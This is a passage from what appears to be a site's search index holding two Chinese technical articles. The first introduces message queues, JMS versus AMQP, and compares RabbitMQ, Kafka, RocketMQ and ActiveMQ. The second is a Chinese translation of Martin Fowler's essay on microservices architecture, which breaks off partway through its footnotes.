“RabbitMQ？”“Kafka？”“RocketMQ？”\u0026hellip;在日常学习与开发过程中，我们常常听到消息队列这个关键词。我也在我的多篇文章中提到了这个概念。可能你是熟练使用消息队列的老手，又或者你是不懂消息队列的新手，不论你了不了解消息队列，本文都将带你搞懂消息队列的一些基本理论。如果你是老手，你可能从本文学到你之前不曾注意的一些关于消息队列的重要概念，如果你是新手，相信本文将是你打开消息队列大门的一板砖。\n一 什么是消息队列    我们可以把消息队列看作是一个存放消息的容器，当我们需要使用消息的时候，直接从容器中取出消息供自己使用即可。\n消息队列是分布式系统中重要的组件之一。使用消息队列主要是为了通过异步处理提高系统性能和削峰、降低系统耦合性。\n我们知道队列 Queue 是一种先进先出的数据结构，所以消费消息时也是按照顺序来消费的。\n二 为什么要用消息队列    通常来说，使用消息队列能为我们的系统带来下面三点好处：\n 通过异步处理提高系统性能（减少响应所需时间）。 削峰/限流 降低系统耦合性。  如果在面试的时候你被面试官问到这个问题的话，一般情况是你在你的简历上涉及到消息队列这方面的内容，这个时候推荐你结合你自己的项目来回答。\n《大型网站技术架构》第四章和第七章均有提到消息队列对应用性能及扩展性的提升。\n2.1 通过异步处理提高系统性能（减少响应所需时间）    将用户的请求数据存储到消息队列之后就立即返回结果。随后，系统再对消息进行消费。\n因为用户请求数据写入消息队列之后就立即返回给用户了，但是请求数据在后续的业务校验、写数据库等操作中可能失败。因此，使用消息队列进行异步处理之后，需要适当修改业务流程进行配合，比如用户在提交订单之后，订单数据写入消息队列，不能立即返回用户订单提交成功，需要在消息队列的订单消费者进程真正处理完该订单之后，甚至出库后，再通过电子邮件或短信通知用户订单成功，以免交易纠纷。这就类似我们平时手机订火车票和电影票。\n2.2 削峰/限流    先将短时间高并发产生的事务消息存储在消息队列中，然后后端服务再慢慢根据自己的能力去消费这些消息，这样就避免直接把后端服务打垮掉。\n举例：在电子商务一些秒杀、促销活动中，合理使用消息队列可以有效抵御促销活动刚开始大量订单涌入对系统的冲击。如下图所示：\n2.3 降低系统耦合性    使用消息队列还可以降低系统耦合性。我们知道如果模块之间不存在直接调用，那么新增模块或者修改模块就对其他模块影响较小，这样系统的可扩展性无疑更好一些。还是直接上图吧：\n生产者（客户端）发送消息到消息队列中去，接受者（服务端）处理消息，需要消费的系统直接去消息队列取消息进行消费即可而不需要和其他系统有耦合，这显然也提高了系统的扩展性。\n消息队列使利用发布-订阅模式工作，消息发送者（生产者）发布消息，一个或多个消息接受者（消费者）订阅消息。 从上图可以看到消息发送者（生产者）和消息接受者（消费者）之间没有直接耦合，消息发送者将消息发送至分布式消息队列即结束对消息的处理，消息接受者从分布式消息队列获取该消息后进行后续处理，并不需要知道该消息从何而来。对新增业务，只要对该类消息感兴趣，即可订阅该消息，对原有系统和业务没有任何影响，从而实现网站业务的可扩展性设计。\n消息接受者对消息进行过滤、处理、包装后，构造成一个新的消息类型，将消息继续发送出去，等待其他消息接受者订阅该消息。因此基于事件（消息对象）驱动的业务架构可以是一系列流程。\n另外，为了避免消息队列服务器宕机造成消息丢失，会将成功发送到消息队列的消息存储在消息生产者服务器上，等消息真正被消费者服务器处理后才删除消息。在消息队列服务器宕机后，生产者服务器会选择分布式消息队列服务器集群中的其他服务器发布消息。\n备注： 不要认为消息队列只能利用发布-订阅模式工作，只不过在解耦这个特定业务环境下是使用发布-订阅模式的。除了发布-订阅模式，还有点对点订阅模式（一个消息只有一个消费者），我们比较常用的是发布-订阅模式。另外，这两种消息模型是 JMS 提供的，AMQP 协议还提供了 5 种消息模型。\n三 使用消息队列带来的一些问题     系统可用性降低： 系统可用性在某种程度上降低，为什么这样说呢？在加入 MQ 之前，你不用考虑消息丢失或者说 MQ 挂掉等等的情况，但是，引入 MQ 之后你就需要去考虑了！ 系统复杂性提高： 加入 MQ 之后，你需要保证消息没有被重复消费、处理消息丢失的情况、保证消息传递的顺序性等等问题！ 一致性问题： 我上面讲了消息队列可以实现异步，消息队列带来的异步确实可以提高系统响应速度。但是，万一消息的真正消费者并没有正确消费消息怎么办？这样就会导致数据不一致的情况了!  四 JMS VS AMQP    4.1 JMS    4.1.1 JMS 简介    JMS（JAVA Message Service,java 消息服务）是 java 的消息服务，JMS 的客户端之间可以通过 JMS 服务进行异步的消息传输。JMS（JAVA Message Service，Java 消息服务）API 是一个消息服务的标准或者说是规范，允许应用程序组件基于 JavaEE 平台创建、发送、接收和读取消息。它使分布式通信耦合度更低，消息服务更加可靠以及异步性。\nActiveMQ 就是基于 JMS 规范实现的。\n4.1.2 JMS 两种消息模型    ① 点到点（P2P）模型\n使用队列（Queue）作为消息通信载体；满足生产者与消费者模式，一条消息只能被一个消费者使用，未被消费的消息在队列中保留直到被消费或超时。比如：我们生产者发送 100 条消息的话，两个消费者来消费一般情况下两个消费者会按照消息发送的顺序各自消费一半（也就是你一个我一个的消费。）\n② 发布/订阅（Pub/Sub）模型\n发布订阅模型（Pub/Sub） 使用主题（Topic）作为消息通信载体，类似于广播模式；发布者发布一条消息，该消息通过主题传递给所有的订阅者，在一条消息广播之后才订阅的用户则是收不到该条消息的。\n4.1.3 JMS 五种不同的消息正文格式    JMS 定义了五种不同的消息正文格式，以及调用的消息类型，允许你发送并接收以一些不同形式的数据，提供现有消息格式的一些级别的兼容性。\n StreamMessage \u0026ndash; Java 原始值的数据流 MapMessage\u0026ndash;一套名称-值对 TextMessage\u0026ndash;一个字符串对象 ObjectMessage\u0026ndash;一个序列化的 Java 对象 BytesMessage\u0026ndash;一个字节的数据流  4.2 AMQP    AMQP，即 Advanced Message Queuing Protocol，一个提供统一消息服务的应用层标准 高级消息队列协议（二进制应用层协议），是应用层协议的一个开放标准，为面向消息的中间件设计，兼容 JMS。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件同产品，不同的开发语言等条件的限制。\nRabbitMQ 就是基于 AMQP 协议实现的。\n4.3 JMS vs AMQP       对比方向 JMS AMQP     定义 Java API 协议   跨语言 否 是   跨平台 否 是   支持消息类型 提供两种消息模型：①Peer-2-Peer;②Pub/sub 提供了五种消息模型：①direct exchange；②fanout exchange；③topic change；④headers exchange；⑤system exchange。本质来讲，后四种和 JMS 的 pub/sub 模型没有太大差别，仅是在路由机制上做了更详细的划分；   支持消息类型 支持多种消息类型 ，我们在上面提到过 byte[]（二进制）    总结：\n AMQP 为消息定义了线路层（wire-level protocol）的协议，而 JMS 所定义的是 API 规范。在 Java 体系中，多个 client 均可以通过 JMS 进行交互，不需要应用修改代码，但是其对跨平台的支持较差。而 AMQP 天然具有跨平台、跨语言特性。 JMS 支持 TextMessage、MapMessage 等复杂的消息类型；而 AMQP 仅支持 byte[] 消息类型（复杂的类型可序列化后发送）。 由于 Exchange 提供的路由算法，AMQP 可以提供多样化的路由方式来传递消息到消息队列，而 JMS 仅支持 队列 和 主题/订阅 方式两种。  五 常见的消息队列对比       对比方向 概要     吞吐量 万级的 ActiveMQ 和 RabbitMQ 的吞吐量（ActiveMQ 的性能最差）要比 十万级甚至是百万级的 RocketMQ 和 Kafka 低一个数量级。   可用性 都可以实现高可用。ActiveMQ 和 RabbitMQ 都是基于主从架构实现高可用性。RocketMQ 基于分布式架构。 kafka 也是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用   时效性 RabbitMQ 基于 erlang 开发，所以并发能力很强，性能极其好，延时很低，达到微秒级。其他三个都是 ms 级。   功能支持 除了 Kafka，其他三个功能都较为完备。 Kafka 功能较为简单，主要支持简单的 MQ 功能，在大数据领域的实时计算以及日志采集被大规模使用，是事实上的标准   消息丢失 ActiveMQ 和 RabbitMQ 丢失的可能性非常低， RocketMQ 和 Kafka 理论上不会丢失。    总结：\n ActiveMQ 的社区算是比较成熟，但是较目前来说，ActiveMQ 的性能比较差，而且版本迭代很慢，不推荐使用。 RabbitMQ 在吞吐量方面虽然稍逊于 Kafka 和 RocketMQ ，但是由于它基于 erlang 开发，所以并发能力很强，性能极其好，延时很低，达到微秒级。但是也因为 RabbitMQ 基于 erlang 开发，所以国内很少有公司有实力做 erlang 源码级别的研究和定制。如果业务场景对并发量要求不是太高（十万级、百万级），那这四种消息队列中，RabbitMQ 一定是你的首选。如果是大数据领域的实时计算、日志采集等场景，用 Kafka 是业内标准的，绝对没问题，社区活跃度很高，绝对不会黄，何况几乎是全世界这个领域的事实性规范。 RocketMQ 阿里出品，Java 系开源项目，源代码我们可以直接阅读，然后可以定制自己公司的 MQ，并且 RocketMQ 有阿里巴巴的实际业务场景的实战考验。RocketMQ 社区活跃度相对较为一般，不过也还可以，文档相对来说简单一些，然后接口这块不是按照标准 JMS 规范走的有些系统要迁移需要修改大量代码。还有就是阿里出台的技术，你得做好这个技术万一被抛弃，社区黄掉的风险，那如果你们公司有技术实力我觉得用 RocketMQ 挺好的 Kafka 的特点其实很明显，就是仅仅提供较少的核心功能，但是提供超高的吞吐量，ms 级的延迟，极高的可用性以及可靠性，而且分布式可以任意扩展。同时 kafka 最好是支撑较少的 topic 数量即可，保证其超高吞吐量。kafka 唯一的一点劣势是有可能消息重复消费，那么对数据准确性会造成极其轻微的影响，在大数据领域中以及日志采集中，这点轻微影响可以忽略这个特性天然适合大数据实时计算以及日志收集。  参考：《Java 工程师面试突击第 1 季-中华石杉老师》\n"},{"id":262,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/microservices-introduction/","title":"microservices-introduction","parent":"微软服务","content":"微服务     翻译自 Martin Fowler 网站 Microservices 一文。文章篇幅较长，阅读需要一点耐心。\n本人水平有限，若有不妥之处，还请各位帮忙指正，谢谢。\n 过去几年中出现了“微服务架构”这一术语，它描述了将软件应用程序设计为若干个可独立部署的服务套件的特定方法。尽管这种架构风格尚未有精确的定义，但围绕业务能力、自动部署、端点智能以及语言和数据的分散控制等组织来说，它们还是存在着某些共同特征。\n“微服务”——在拥挤的软件架构街道上又一个新名词。虽然我们的自然倾向是对它轻蔑一瞥，但这一术语描述了一种越来越具有吸引力的软件系统风格。在过去几年中，我们已经看到许多项目使用了这种风格，到目前为止其结果都是正向的，以至于它变成了我们 ThoughtWorks 许多同事构建企业应用程序的默认风格。然而遗憾的是，并没有太多信息可以概述微服务的风格以及如何实现。\n简而言之，微服务架构风格[1]是一种将单个应用程序开发为一套小型服务的方法，每个小型服务都在自己的进程中运行，并以轻量级机制（通常是 HTTP 资源 API）进行通信。这些服务围绕业务功能构建，可通过全自动部署机制来独立部署。这些服务共用一个最小型的集中式管理，它们可以使用不同的编程语言编写，并使用不同的数据存储技术。\n在开始解释微服务风格之前，将它与单体（monolithic）风格进行比较是有用的：单体应用程序被构建为单一单元。企业应用程序通常由三个部分构成：客户端用户界面（由用户机器上的浏览器中运行的 HTML 页面和 Javascript 组成）、数据库（由许多表组成，通常是在关系型数据库中管理）系统、服务器端应用程序。服务器端应用程序处理 HTTP 请求，执行一些逻辑处理，从数据库检索和更新数据，选择数据并填充到要发送到浏览器的 HTML 视图中。这个服务器端应用程序是一个整体——一个逻辑可执行文件[2]。对系统的任何更改都涉及构建和部署新版本的服务器端应用程序。\n这种单体服务器是构建这种系统的自然方式。处理一个请求的所有逻辑都在一个进程中运行，允许你使用语言的基本功能将应用程序划分为类、函数和命名空间。需要注意的是，你可以在开发人员的笔记本电脑上运行和测试应用程序，并使用部署管道确保对程序做出的改动被适当测试并部署到生产环境中。你可以通过在负载均衡器后面运行许多实例来水平扩展整体块。\n单体应用程序可以取得成功，但越来越多的人对它们感到不满——尤其是在将更多应用程序部署到云的时候。变更周期被捆绑在一起——即使只是对应用程序的一小部分进行了更改，也需要重建和部署整个单体应用。随着时间的推移，通常很难保持良好的模块化结构，也更难以保持应该只影响该模块中的一个模块的更改。对系统进行扩展时，不得不扩展整个应用系统，而不能仅扩展该系统中需要更多资源的那些部分。\n这些不满催生了微服务架构风格：将应用程序构建为服务套件。除了服务可独立部署、独立扩展的事实之外，每个服务还提供了一个牢固的模块边界，甚至允许以不同的编程语言编写不同的服务。他们也可以由不同的团队管理。\n我们并不认为微服务风格是新颖的或创新的，其根源至少可以追溯到 Unix 的设计原则。但我们认为没有足够多的人考虑微服务架构，如果使用它，许多软件的开发会变得更好。\n微服务架构的特征    虽然不能说微服务架构风格有正式的定义，但我们可以尝试描述一下我们认为的在符合这个标签的架构中，它们所具有的一些共同特征。与概述共同特征的任何定义一样，并非所有微服务架构都具有所有特征，但我们确实期望大多数微服务架构都具有大多数特征。虽然我们的作者一直是这个相当宽松的社区的活跃成员，但我们的本意还是尝试描述我们两人在自己和自己所了解的团队的工作中所看到的情况。特别要说明的是，我们没有制定一些相关的定义。\n通过服务进行组件化    只要我们参与软件行业，就一直希望通过将组件集成在一起来构建系统，就像我们在物理世界中看到的事物的构建方式一样。在过去的几十年中，我们已经看到了大多数语言平台的公共软件库都取得了极大的进展。\n在谈论组件时，就会碰到一个有关定义的难题，即什么是组件？我们的定义是，组件是可独立更换和升级的软件单元。\n微服务架构也会使用软件库，但组件化软件的主要方式是拆分为多个服务。我们把库定义为链接到程序并使用内存函数调用来调用的组件，而服务是一种进程外组件，通过 Web 服务请求或远程过程调用等机制进行通信。（这与许多面向对象程序中的服务对象的概念是不同的[3]。）\n将服务作为组件（而不是库）的一个主要原因是服务可以独立部署。如果你有一个应用程序[4]是由单一进程里的多个库组成，任何一个组件的更改都会导致整个应用程序的重新部署。但如果应用程序可拆分为多个服务，那么单个服务的变更只需要重新部署该服务即可。当然这也不是绝对的，一些服务接口的修改可能会导致多个服务之间的协同修改，但一个好的微服务架构的目的是通过内聚服务边界和服务协议的演进机制来最小化这些协同修改。\n将服务用作组件的另一个结果是更明确的组件接口。大多数语言没有一个良好的机制来定义显式发布的接口。通常，它只是文档和规则来阻止客户端破坏组件的封装，这会导致组件之间过于紧耦合。通过使用显式远程调用机制，服务可以更轻松地避免这种情况。\n像这样使用服务确实存在一些不好的地方。远程调用比进程内调用更昂贵，远程 API 需要设计成较粗的粒度，这通常更难以使用。如果你需要更改组件之间的职责分配，那么当你跨越进程边界时，这种组件行为的改动会更加难以实现。\n近似地，我们可以把一个个服务映射为一个个运行时进程，但这仅仅是一个近似而已。一个服务可能包括多个始终一起开发和部署的进程，比如一个应用系统的进程和仅由该服务使用的数据库。\n围绕业务能力进行组织    在将大型应用程序拆分为多个部分时，管理层往往侧重于技术层面，从而导致 UI 团队、服务器端逻辑团队、数据库团队的划分。当团队按照这些方式分开时，即便是简单的更改也可能导致跨团队项目的时间和预算批准。一个聪明的团队将围绕这个进行优化，“两害相权取其轻”——只需将逻辑强制应用到他们可以访问的任何应用程序中。换句话说，逻辑无处不在。这是康威定律[5]的一个例子。\n 任何设计系统（广义上的）的组织都会产生一种设计，其结构是组织通信结构的副本。\n—— 梅尔文•康威，1967 年\n 微服务采用不同的划分方式，它是围绕业务功能将系统拆分为多个服务 。这些服务为该业务领域采用广泛的软件实现，包括用户界面、持久化存储和任何外部协作。因此，团队是跨职能的，包括开发所需的全部技能：用户体验、数据库和项目管理。\n以这种方式组建的一家公司是 www.comparethemarket.com。跨职能团队负责构建和运营每个产品，每个产品拆分为多个独立的服务，彼此通过消息总线来通信。\n大型单体应用程序也可以围绕业务功能进行模块化，尽管这不是常见的情况。当然，我们会敦促构建单体应用系统的大型团队根据业务线来将自己分解为若干小团队。我们在这里看到的主要问题是，它们往往围绕太多的上下文进行组织。如果单体跨越了模块边界，对团队的个体成员来说，很难将它们装入短期的记忆中。此外，我们看到模块化生产线需要大量的规则来执行。服务组件所要求的更加明确的分离，使得它更容易保持团队边界清晰。\n是产品不是项目    我们看到的大多数应用程序开发工作都使用这样一个项目模式：目标是交付一些软件，然后就完工了。一旦完成后，软件将移交给维护组织，然后构建它的项目团队也随之解散了。\n微服务支持者倾向于避免这种模式，而是认为团队应该负责产品的整个生命周期。对此一个共同的启示是亚马逊的 “you build, you run it” 的概念，开发团队对生产中的软件负全部责任。这使开发者经常接触他们的软件在生产环境如何工作，并增加与他们的用户联系，因为他们必须承担至少部分的支持工作。\n产品心态与业务能力的联系紧密相连。要持续关注软件如何帮助用户提升业务能力，而不是把软件看成是将要完成的一组功能。\n没有理由说为什么这种方法不能用在单一应用程序上，但较小的服务粒度，使得它更容易在服务开发者和用户之间建立个人关系。\n智能端点和哑管    在不同进程之间建立通信时，我们已经看到许多产品和方法，都强调将大量的智能特性放入通信机制本身。一个很好的例子是企业服务总线（ESB），其中 ESB 产品通常包括用于消息路由、编排、转换和应用业务规则的复杂工具。\n微服务社区倾向于采用另一种方法：智能端点和哑管。基于微服务构建的应用程序的目标是尽可能的解耦和尽可能的内聚——他们拥有自己的领域逻辑，他们的行为更像经典 UNIX 理念中的过滤器——接收请求，应用适当的逻辑并产生响应。使用简单的 REST 风格的协议来编排它们，而不是使用像 WS-Choreography 或者 BPEL 或者通过中心工具编制(orchestration)等复杂的协议。\n最常用的两种协议是带有资源 API 的 HTTP 请求-响应和轻量级消息传递[8]。对第一种协议最好的表述是\n 本身就是 web，而不是隐藏在 web 的后面。\n——Ian Robinson\n 微服务团队使用的规则和协议，正是构建万维网的规则和协议(在更大程度上是 UNIX 的)。从开发者和运营人员的角度讲，通常使用的资源可以很容易的缓存。\n第二种常用方法是在轻量级消息总线上传递消息。选择的基础设施是典型的哑的(哑在这里只充当消息路由器)——像 RabbitMQ 或 ZeroMQ 这样简单的实现仅仅提供一个可靠的异步交换结构 ——在服务里，智能特性仍旧存在于那些生产和消费诸多消息的各个端点中，即存在于各个服务中。\n单体应用中，组件都在同一进程内执行，它们之间通过方法调用或函数调用通信。把单体变成微服务最大的问题在于通信模式的改变。一种幼稚的转换是从内存方法调用转变成 RPC，这导致频繁通信且性能不好。相反，你需要用粗粒度通信代替细粒度通信。\n去中心化的治理    集中治理的一个后果是单一技术平台的标准化发展趋势。经验表明，这种方法正在收缩 ——不是每个问题都是钉子，不是每个问题都是锤子。我们更喜欢使用正确的工具来完成工作，而单体应用程序在一定程度上可以利用语言的优势，这是不常见的。\n把单体的组件分裂成服务，在构建这些服务时可以有自己的选择。你想使用 Node.js 开发一个简单的报告页面？去吧。用 C++ 实现一个特别粗糙的近乎实时的组件？好极了。你想换用一个更适合组件读操作数据的不同风格的数据库？我们有技术来重建它。\n当然，仅仅因为你可以做些什么，而不意味着你应该这样做——但用这种方式划分系统意味着你可以选择。\n团队在构建微服务时也更喜欢用不同的方法来达标。他们更喜欢生产有用的工具这种想法，而不是写在纸上的标准，这样其他开发者可以用这些工具解决他们所面临的相似的问题。有时，这些工具通常在实施中收获并与更广泛的群体共享，但不完全使用一个内部开源模型。现在 git 和 github 已经成为事实上的版本控制系统的选择，在内部开放源代码的实践也正变得越来越常见。\nNetflix 是遵循这一理念的一个很好的例子。尤其是，以库的形式分享有用的且经过市场检验的代码，这激励其他开发者用类似的方式解决相似的问题，同时还为采用不同方法敞开了大门。共享库倾向于聚焦在数据存储、进程间通信和我们接下来要深入讨论的基础设施自动化的共性问题。\n对于微服务社区来说，开销特别缺乏吸引力。这并不是说社区不重视服务合约。恰恰相反，因为他们有更多的合约。只是他们正在寻找不同的方式来管理这些合约。像 Tolerant Reader 和 Consumer-Driven Contracts 这样的模式通常被用于微服务。这些援助服务合约在独立进化。执行消费者驱动的合约作为构建的一部分，增加了信心并对服务是否在运作提供了更快的反馈。事实上，我们知道澳大利亚的一个团队用消费者驱动的合约这种模式来驱动新业务的构建。他们使用简单的工具定义服务的合约。这已变成自动构建的一部分，即使新服务的代码还没写。服务仅在满足合约的时候才被创建出来 - 这是在构建新软件时避免 \u0026ldquo;YAGNI\u0026rdquo;[9] 困境的一个优雅的方法。围绕这些成长起来的技术和工具，通过减少服务间的临时耦合，限制了中心合约管理的需要。\n也许去中心化治理的最高境界就是亚马逊广为流传的 build it/run it 理念。团队要对他们构建的软件的各方面负责，包括 7*24 小时的运营。这一级别的责任下放绝对是不规范的，但我们看到越来越多的公司让开发团队负起更多责任。Netflix 是采用这一理念的另一家公司[11]。每天凌晨 3 点被传呼机叫醒无疑是一个强有力的激励，使你在写代码时关注质量。这是关于尽可能远离传统的集中治理模式的一些想法。\n分散数据管理    数据管理的去中心化有许多不同的呈现方式。在最抽象的层面上，这意味着使系统间存在差异的世界概念模型。在整合一个大型企业时，客户的销售视图将不同于支持视图，这是一个常见的问题。客户的销售视图中的一些事情可能不会出现在支持视图中。它们确实可能有不同的属性和(更坏的)共同属性，这些共同属性在语义上有微妙的不同。\n这个问题常见于应用程序之间，但也可能发生在应用程序内部，尤其当应用程序被划分成分离的组件时。一个有用的思维方式是有界上下文(Bounded Context)内的领域驱动设计(Domain-Driven Design, DDD)理念。DDD 把一个复杂域划分成多个有界的上下文，并且映射出它们之间的关系。这个过程对单体架构和微服务架构都是有用的，但在服务和上下文边界间有天然的相关性，边界有助于澄清和加强分离，就像业务能力部分描述的那样。\n和概念模型的去中心化决策一样，微服务也去中心化数据存储决策。虽然单体应用程序更喜欢单一的逻辑数据库做持久化存储，但企业往往倾向于一系列应用程序共用一个单一的数据库——这些决定是供应商授权许可的商业模式驱动的。微服务更倾向于让每个服务管理自己的数据库，或者同一数据库技术的不同实例，或完全不同的数据库系统 - 这就是所谓的混合持久化(Polyglot Persistence)。你可以在单体应用程序中使用混合持久化，但它更常出现在为服务里。\n对跨微服务的数据来说，去中心化责任对管理升级有影响。处理更新的常用方法是在更新多个资源时使用事务来保证一致性。这个方法通常用在单体中。\n像这样使用事务有助于一致性，但会产生显著地临时耦合，这在横跨多个服务时是有问题的。分布式事务是出了名的难以实现，因此微服务架构强调服务间的无事务协作，对一致性可能只是最后一致性和通过补偿操作处理问题有明确的认知。\n对很多开发团队来说，选择用这样的方式管理不一致性是一个新的挑战，但这通常与业务实践相匹配。通常业务处理一定程度的不一致，以快速响应需求，同时有某些类型的逆转过程来处理错误。这种权衡是值得的，只要修复错误的代价小于更大一致性下损失业务的代价。\n基建自动化    基础设施自动化技术在过去几年中发生了巨大变化——特别是云和 AWS 的发展降低了构建、部署和运行微服务的操作复杂性。\n许多使用微服务构建的产品或系统都是由具有丰富的持续交付和持续集成经验的团队构建的。以这种方式构建软件的团队广泛使用基础设施自动化技术。如下面显示的构建管道所示。\n由于这并不是一篇关于持续交付的文章，我们在这里只关注持续交付的几个关键特性。我们希望有尽可能多的信心确保我们的软件正常运行，因此我们进行了大量的自动化测试。想让软件达到“晋级”(Promotion)状态从而“推上”流水线，就意味着要在每一个新的环境中，对软件进行自动化部署。\n一个单体应用程序可以非常愉快地通过这些环境构建、测试和推动。事实证明，一旦你为单体投入了自动化整体生产，那么部署更多的应用程序似乎不再那么可怕了。请记住，持续交付的目标之一就是让“部署”工作变得“枯燥”，所以无论是一个还是三个应用程序，只要部署工作依旧很“枯燥”，那么就没什么可担心的了[12]。\n我们看到团队大量的基础设施自动化的另一个领域是在管理生产环境中的微服务。与我们上面的断言（只要部署很无聊）相比，单体和微服务之间没有太大的区别，但是每个部署的运行环境可能会截然不同。\n设计时为故障做好准备    使用服务作为组件的结果是，需要设计应用程序以便它们能够容忍服务的失败。如果服务提供者商不可用，任何服务呼叫都可能失败，客户必须尽可能优雅地对此做出响应。与单体设计相比，这是一个缺点，因为它这会引入额外的复杂性来处理它。结果是微服务团队不断反思服务失败是如何影响用户体验的。Netflix 的 Simian Army 能够引发服务甚至数据中心的故障在工作日发生故障，从而来测试应用程序的弹性和监控能力。\n生产中的这种自动化测试足以让大多数运维团队兴奋得浑身颤栗，就像在一周的长假即将到来前一样。这并不是说单体架构风格不能构建先进的监控系统——只是根据我们的经验，这在单体系统中并不常见罢了。\n由于服务可能随时发生故障，因此能够快速检测故障并在可能的情况下自动恢复服务就显得至关重要。微服务应用程序非常重视应用程序的实时监控，比如检查架构元素（数据库每秒获得多少请求）和业务相关度量（例如每分钟收到多少订单）。语义监控可以提供出现问题的早期预警系统，从而触发开发团队跟进和调查。\n这对于微服务架构来说尤为重要，因为微服务偏好编排和事件写作，这会导致一些紧急状况。虽然许多权威人士对于偶然事件的价值持积极态度，但事实是，“突发行为”有时可能是一件坏事。监控至关重要，它能够快速发现不良紧急行为并进行修复。\n单体系统也可以像微服务一样实现透明的监控——事实上，它们也应该如此。不同之处在于你必须能够知道在不同进程中运行的服务在何时断开了连接。对于同一过程中的库，这种透明性用处并不大。\n微服务团队希望看到针对每个服务的复杂监控和日志记录，例如显示“运行/宕机”状态的仪表盘以及各种运维和业务相关的指标。有关断路器状态，当前吞吐量和延迟的详细信息也是我们在工作中经常遇到的其他例子。\n演化设计    微服务从业者通常有进化设计的背景，并把服务分解视为进一步的工具，使应用程序开发人员能够控制应用程序中的更改，而不会降低变更速度。变更控制并不一定意味着变更的减少——在正确的态度和工具的帮助下，你可以对软件进行频繁，快速且有良好控制的更改。\n每当要试图将软件系统分解为组件时，你就会面临这样的决策，即如何进行拆分——我们决定拆分应用程序的原则是什么？组件的关键属性具有独立替换和可升级性的特点[13]——这意味着我们寻找这些点，想象如何在不影响其协作者的情况下重写组件。实际上，许多微服务组通过明确地期望许多服务被废弃而不是长期演变来进一步考虑这一点。\nGuardian 网站是设计和构建成单体应用程序的一个很好的例子，但是它也在微服务方向上不断发展演化。原先的单体系统仍然是网站的核心，但他们更喜欢通过构建一些微服务 API 的方式来添加新的功能。这种方法对于本质上是临时的功能尤其方便，例如处理体育赛事的专用页面。网站的这一部分可以使用快速开发语言快速组合在一起，在赛事结束后立即删除。我们在金融机构看到过类似的方法，为市场机会增加新服务，并在几个月甚至几周后丢弃。\n这种强调可替换性的特点，是模块化设计一般性原则的一个特例，即通过变化模式来驱动模块化的实现[14]。大家都愿意将那些同时发生变化的东西放在同一个模块，很少变化的系统模块应该与目前正在经历大量变动的系统处于不同的服务中。如果你发现自己反复更改两项服务，那就表明它们应该合并了。\n将组件放入服务中可以为更细粒度的发布计划添加机会。对于单体来说，任何更改都需要完整构建和部署整个应用程序。但是，使用微服务，你只需要重新部署你修改的服务。这可以简化并加快发布过程。缺点是你必须担心一项服务的变化会打破其消费者。传统的集成方法是尝试使用版本控制来解决这个问题，但微服务世界中的偏好是仅仅把使用版本控制作为最后的手段。我们可以通过设计服务尽可能容忍服务提供者的变化来避免大量的版本控制。\n微服务是未来吗？    我们写这篇文章的主要目的是解释微服务的主要思想和原则。通过花时间来做到这一点，我们清楚地认为微服务架构风格是一个重要的想法——在研发企业系统时，值得对它进行认真考虑。我们最近使用这种方式构建了几个系统，并且了解到其它团队也赞同这种风格。\n我们了解到那些在某种程度上开创这种架构风格的先驱，包括亚马逊、Netflix、英国卫报、英国政府数字化服务中心、realestate.com.au、Forward 和 comparethemarket.com。2013 年的技术会议上充满了一些公司的例子，这些公司正在转向可以归类为微服务的公司，包括 Travis CI。此外，有很多组织长期以来一直在做我们称之为微服务的东西，但没有使用过这个名字。（通常这被标记为 SOA——尽管如我们所说，SOA 有许多相互矛盾的形式。[15]）\n然而，尽管有这些积极的经验，但并不是说我们确信微服务是软件架构的未来发展方向。虽然到目前为止我们的经验与整体应用相比是积极的，但我们意识到没有足够的时间让我们做出充分完整的判断。\n通常，架构决策所产生的真正效果，只有在该决策做出若干年后才能真正显现。我们已经看到由带着强烈的模块化愿望的优秀团队所做的一些项目，最终却构建出一个单体架构，并在几年之内不断腐化。许多人认为，如果使用微服务就不大可能出现这种腐化，因为服务的边界是明确的，而且难以随意搞乱。然而，对于那些开发时间足够长的各种系统，除非我们已经见识得足够多，否则我们无法真正评价微服务架构是如何成熟的。\n有人觉得微服务或许很难成熟起来，这当然是有原因的。在组件化上所做的任何工作的成功与否，取决于软件与组件的匹配程度。准确地搞清楚某个组件的边界的位置应该出现在哪里，是一项困难的工作。进化设计承认难以对边界进行正确定位，所以它将工作的重点放到了易于对边界进行重构之上。但是当各个组件成为各个进行远程通信的服务后，比起在单一进程内进行各个软件库之间的调用，此时的重构就变得更加困难。跨越服务边界的代码移动就变得困难起来。接口的任何变化，都需要在其各个参与者之间进行协调。向后兼容的层次也需要被添加进来。测试也会变得更加复杂。\n另一个问题是，如果这些组件不能干净利落地组合成一个系统，那么所做的一切工作，仅仅是将组件内的复杂性转移到组件之间的连接之上。这样做的后果，不仅仅是将复杂性搬了家，它还将复杂性转移到那些不再明确且难以控制的边界之上。当在观察一个小型且简单的组件内部时，人们很容易觉得事情已经变得更好了，然而他们却忽视了服务之间杂乱的连接。\n最后，还有一个团队技能的因素。新技术往往会被技术更加过硬的团队所采用。对于技术更加过硬的团队而更有效的一项技术，不一定适用于一个技术略逊一筹的团队。我们已经看到大量这样的案例，那些技术略逊一筹的团队构建出了杂乱的单体架构。当这种杂乱发生到微服务身上时，会出现什么情况？这需要花时间来观察。一个糟糕的团队，总会构建一个糟糕的系统——在这种情况下，很难讲微服务究竟是减少了杂乱，还是让事情变得更糟。\n我们听到的一个合理的论点是，你不应该从微服务架构开始，而是从整体开始，保持模块化，并在整体出现问题时将其拆分为微服务。（这个建议并不理想，因为好的进程内接口通常不是一个好的服务接口。）\n所以我们谨慎乐观地写下这个。到目前为止，我们已经看到了足够多的微服务风格，觉得它可能是一条值得走的路。我们无法确定最终会在哪里结束，但软件开发的挑战之一是你只能根据你当前必须拥有的不完善信息做出决策。\n脚注    1: The term \u0026ldquo;microservice\u0026rdquo; was discussed at a workshop of software architects near Venice in May, 2011 to describe what the participants saw as a common architectural style that many of them had been recently exploring. In May 2012, the same group decided on \u0026ldquo;microservices\u0026rdquo; as the most appropriate name. James presented some of these ideas as a case study in March 2012 at 33rd Degree in Krakow in Microservices - Java, the Unix Way as did Fred George about the same time. Adrian Cockcroft at Netflix, describing this approach as \u0026ldquo;fine grained SOA\u0026rdquo; was pioneering the style at web scale as were many of the others mentioned in this article - Joe Walnes, Dan North, Evan Botcher and Graham Tackley.\n2: The term monolith has been in use by the Unix community for some time. It appears in The Art of Unix Programming to describe systems that get too big.\n3: Many 